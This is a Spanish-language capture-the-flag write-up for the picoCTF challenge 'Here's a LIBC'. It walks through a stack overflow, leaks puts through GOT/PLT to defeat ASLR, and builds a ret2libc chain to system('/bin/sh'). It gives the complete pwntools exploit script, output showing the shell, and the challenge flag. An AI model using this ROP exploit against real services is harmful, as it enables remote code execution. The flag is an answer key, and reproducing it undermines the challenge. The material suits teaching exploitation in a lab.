@@ -1,0 +1,239 @@
+I"=X<p>Realizaremos un ataque ret2libc para hacer bypass de NX, ademas usaremos puts en GOT y PLT para lekear valores y evadir el ASLR</p>
+
+<h2 class="lead" id="analisis">Analisis</h2>
+
+<p>Para no hacerlo tan largo por que no es la gran cosa el codigo, me voy a ir directamente a la funcion importante que se llama <code class="language-plaintext highlighter-rouge">do_stuff</code>, como ingrese el codigo a radare quiero resalar que:</p>
+
+<p>La variable que toma nuestro input de esta declarando como <code class="language-plaintext highlighter-rouge">var uint32_t var_8h @ rbp-0x8</code> la cual recibe 112 bytes</p>
+
+<p>La funcion que recibe nuestro input <code class="language-plaintext highlighter-rouge">scanf</code> no esta limitando los caracteres que le metemos:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x004006fe      e87dfeffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
+│           0x00400703      488d857fffff.  lea rax, [var_81h]
+│           0x0040070a      4889c6         mov rsi, rax
+│           0x0040070d      488d3d260200.  lea rdi, [0x0040093a]       ; "%c" ; const char *format
+│           0x00400714      b800000000     mov eax, 0
+</code></pre></div></div>
+<p>Y ademas en esto de arriba se esta usando la variable <code class="language-plaintext highlighter-rouge">var_81h</code> ya que nuestro input lo transforma de minusculas a mayusculas y viceversa</p>
+
+<h2 id="crafteando-el-exploit---parte-1">Crafteando el exploit - parte 1</h2>
+
+<h3 id="sacando-el-offset-de-el-rip">Sacando el offset de el RIP</h3>
+
+<p>Una vez sabiendo que tenemos un buffer de 112 y no hay un limite para nuestro input entonces pasaremos a sacer el offset de el RIP</p>
+
+<p>Con gdb y el comando <code class="language-plaintext highlighter-rouge">cyclic 200</code> generare 200 bytes que le pasare como input al programa, una vez que pete para sacar el desplazamiento para llegar al RIP podemos usar el offset del RBP y sumarle 8 o tomar 8 bytes de el RSP, yo tomare 8 de el RSP y queda asi:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; cyclic -l raaaaaaa
+Lookup value: b'raaaaaaa'
+136
+</code></pre></div></div>
+<p>Y el desplazamiento para llegar al RIP es 136.</p>
+
+<p>Ahora, el binario tiene NX, asi que no podemos ejecutar una shellcode en el stack asi que podemos recurrir a tecnicas que usen ROP, como ret2libc, y lo mas clasico es sacar la direccion de <code class="language-plaintext highlighter-rouge">system</code> y <code class="language-plaintext highlighter-rouge">/bin/sh</code>, el problema es que tenemos ASLR asi que podemos hacer uso de un clasico, hacer uso de la funcion <code class="language-plaintext highlighter-rouge">puts</code> para lekear valores, para esto tenemos que sacar la direccion de <code class="language-plaintext highlighter-rouge">puts</code> en PLT y como esta funcion espera un argumento, podemos usar <code class="language-plaintext highlighter-rouge">puts</code> pero ahora en GOT y otro clasico es usar <code class="language-plaintext highlighter-rouge">setbuf</code> en GOT pero en esta caso usare <code class="language-plaintext highlighter-rouge">puts</code>, ademas como estamos en x64 tenemos que poner <code class="language-plaintext highlighter-rouge">RDI</code> como primer argumento en una funcion</p>
+
+<h3 id="puts-en-plt-y-puts-en-got">puts en PLT y puts en GOT</h3>
+
+<p>Para sacar puts en PLT podemos usar: <code class="language-plaintext highlighter-rouge">objdump -d vuln_patched | grep puts</code> y esto nos da:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0000000000400540 &lt;puts@plt&gt;:
+  400540:	ff 25 d2 0a 20 00    	jmp    *0x200ad2(%rip)        # 601018 &lt;puts@GLIBC_2.2.5&gt;
+  400769:	e8 d2 fd ff ff       	call   400540 &lt;puts@plt&gt;
+  400891:	e8 aa fc ff ff       	call   400540 &lt;puts@plt&gt;
+</code></pre></div></div>
+<p>Y vamos a ocupar la <code class="language-plaintext highlighter-rouge">400540</code></p>
+
+<p>Y para sacer puts en GOT podemos usar: <code class="language-plaintext highlighter-rouge">objdump -R vuln_patched | grep puts</code>:</p>
+
+<p><code class="language-plaintext highlighter-rouge">0000000000601018 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5</code></p>
+
+<p>Y es la <code class="language-plaintext highlighter-rouge">601018</code></p>
+
+<h3 id="pop-rdi">pop rdi</h3>
+
+<p>Para sacar esto podemos hacer uso de <code class="language-plaintext highlighter-rouge">ropper</code>, <code class="language-plaintext highlighter-rouge">ROPGadget</code> o radare con el comando <code class="language-plaintext highlighter-rouge">/R</code>, en mi caso usare ropper con el comando <code class="language-plaintext highlighter-rouge">ropper -f vuln_patched | grep 'rdi'</code> y usaremos este <code class="language-plaintext highlighter-rouge">0x0000000000400913: pop rdi; ret;</code></p>
+
+<p>Esto lo hacemos ya que debemos de meter puts en GOT en rdi</p>
+
+<h3 id="direccion-de-main">Direccion de main</h3>
+
+<p>Otra cosa importante es la direccion de main, ya que con esta el programa sabra a donde regresar o no petara</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>readelf -s vuln | grep main                                                                                                                          ─╯
+    63: 0000000000400771   305 FUNC    GLOBAL DEFAULT   13 main
+</code></pre></div></div>
+
+<h3 id="ejecutando-el-exploit">Ejecutando el exploit</h3>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">host</span> <span class="o">=</span> <span class="s">"mercury.picoctf.net"</span>
+<span class="n">puerto</span> <span class="o">=</span> <span class="mi">42072</span> <span class="c1">#&lt;-- Esto lo cambias
+</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">puerto</span><span class="p">)</span>
+
+<span class="n">padding</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="mi">136</span>
+<span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x400913</span>
+<span class="n">puts_got</span> <span class="o">=</span> <span class="mh">0x601018</span>
+<span class="n">puts_plt</span> <span class="o">=</span> <span class="mh">0x400540</span>
+<span class="n">main</span> <span class="o">=</span> <span class="mh">0x400771</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">main</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'WeLcOmE To mY EcHo sErVeR!</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+
+<span class="n">puts</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">().</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"Direccion de puts en tiempo de ejecucion: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">puts</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Ahora ya tenemos la direccion de <code class="language-plaintext highlighter-rouge">puts</code> en tiempo de ejecucion:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 exploit.py                                                ─╯
+<span class="o">[</span>+] Opening connection to mercury.picoctf.net on port 42072: Done
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Direccion de puts en tiempo de ejecucion: 0x7f6d50592a30
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Closed connection to mercury.picoctf.net port 42072
+</code></pre></div></div>
+
+<h2 id="crafteando-el-exploit---parte-2">Crafteando el exploit - parte 2</h2>
+
+<h3 id="direccion-base-de-libc">Direccion base de libc</h3>
+
+<p>Para esto tenemos que sacar el offset de puts en libc y restarselo a la direccion de puts en tiempo de ejecucion</p>
+
+<p>Con el comando: <code class="language-plaintext highlighter-rouge">readelf -s libc.so.6 | grep puts</code> podemos sacar el offset de puts en libc:</p>
+
+<p><code class="language-plaintext highlighter-rouge">422: 0000000000080a30   512 FUNC    WEAK   DEFAULT   13 puts@@GLIBC_2.2.5</code></p>
+
+<p>El cual es: <code class="language-plaintext highlighter-rouge">80a30</code></p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">host</span> <span class="o">=</span> <span class="s">"mercury.picoctf.net"</span>
+<span class="n">puerto</span> <span class="o">=</span> <span class="mi">42072</span> <span class="c1">#&lt;-- Esto lo cambias
+</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">puerto</span><span class="p">)</span>
+
+<span class="n">padding</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="mi">136</span>
+<span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x400913</span>
+<span class="n">puts_got</span> <span class="o">=</span> <span class="mh">0x601018</span>
+<span class="n">puts_plt</span> <span class="o">=</span> <span class="mh">0x400540</span>
+<span class="n">main</span> <span class="o">=</span> <span class="mh">0x400771</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">main</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'WeLcOmE To mY EcHo sErVeR!</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+
+<span class="n">puts</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">().</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"Direccion de puts en tiempo de ejecucion: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">puts</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+<span class="n">offset_puts</span> <span class="o">=</span> <span class="mh">0x80a30</span>
+
+<span class="n">libc</span> <span class="o">=</span> <span class="n">puts</span> <span class="o">-</span> <span class="n">offset_puts</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">'Direccion base de libc: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>  
+</code></pre></div></div>
+
+<p>Ahora ya tenemos la direccion base de libc:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 exploit.py                                                ─╯
+<span class="o">[</span>+] Opening connection to mercury.picoctf.net on port 42072: Done
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Direccion de puts en tiempo de ejecucion: 0x7f9fa002ca30
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Direccion base de libc: 0x7f9f9ffac000
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Closed connection to mercury.picoctf.net port 42072
+</code></pre></div></div>
+
+<h3 id="direccion-de-system-y-binsh">Direccion de system y /bin/sh</h3>
+
+<p>System:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>readelf -s libc.so.6 | grep system                                       ─╯
+  1403: 000000000004f4e0    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
+</code></pre></div></div>
+
+<p>/bin/sh:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>strings -atx libc.so.6 | grep /bin/sh                                                                                                                ─╯
+ 1b40fa /bin/sh
+</code></pre></div></div>
+<p>Esto lo hacemos por que debemos de llamar a system con /bin/sh, y para eso debemos de usar otra vez <code class="language-plaintext highlighter-rouge">pop rdi</code></p>
+
+<p>Adicionalmente ocupamos la direccion de <code class="language-plaintext highlighter-rouge">ret</code> antes de llamar a system por cuestiones de stack alignment (la direccion la saque con ropper)</p>
+
+<h3 id="exploit-final">Exploit final</h3>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">host</span> <span class="o">=</span> <span class="s">"mercury.picoctf.net"</span>
+<span class="n">puerto</span> <span class="o">=</span> <span class="mi">42072</span> <span class="c1">#&lt;-- Esto lo cambias
+</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">puerto</span><span class="p">)</span>
+
+<span class="n">padding</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="mi">136</span>
+<span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x400913</span>
+<span class="n">puts_got</span> <span class="o">=</span> <span class="mh">0x601018</span>
+<span class="n">puts_plt</span> <span class="o">=</span> <span class="mh">0x400540</span>
+<span class="n">main</span> <span class="o">=</span> <span class="mh">0x400771</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">main</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'WeLcOmE To mY EcHo sErVeR!</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+
+<span class="n">puts</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">().</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"Direccion de puts en tiempo de ejecucion: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">puts</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+<span class="n">offset_puts</span> <span class="o">=</span> <span class="mh">0x80a30</span>
+
+<span class="n">libc</span> <span class="o">=</span> <span class="n">puts</span> <span class="o">-</span> <span class="n">offset_puts</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">'Direccion base de libc: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>  
+
+<span class="n">offset_system</span> <span class="o">=</span> <span class="mh">0x4f4e0</span>
+<span class="n">offset_bin_sh</span> <span class="o">=</span> <span class="mh">0x1b40fa</span>
+
+<span class="n">system</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="n">offset_system</span>
+<span class="n">bin_sh</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="n">offset_bin_sh</span> 
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40052e</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+<h3 id="flag">Flag</h3>
+
+<p>Y ahora ya tenemos la flag:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 exploit.py                                                ─╯
+<span class="o">[</span>+] Opening connection to mercury.picoctf.net on port 42072: Done
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Direccion de puts en tiempo de ejecucion: 0x7f8fa1699a30
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Direccion base de libc: 0x7f8fa1619000
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
+WeLcOmE To mY EcHo sErVeR!
+AaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAaAAAAAAAAAAAAAAAAAAAAd
+<span class="nv">$ </span><span class="nb">cat </span>flag.txt
+picoCTF<span class="o">{</span>1_&lt;3_sm4sh_st4cking_3a9ee516616d21b3<span class="o">}</span>
+<span class="nv">$ </span><span class="nb">whoami
+</span>here-s-a-libc_0
+</code></pre></div></div>
+
+<p>Eso ha sido todo, gracias por leer ❤</p>
+:ET
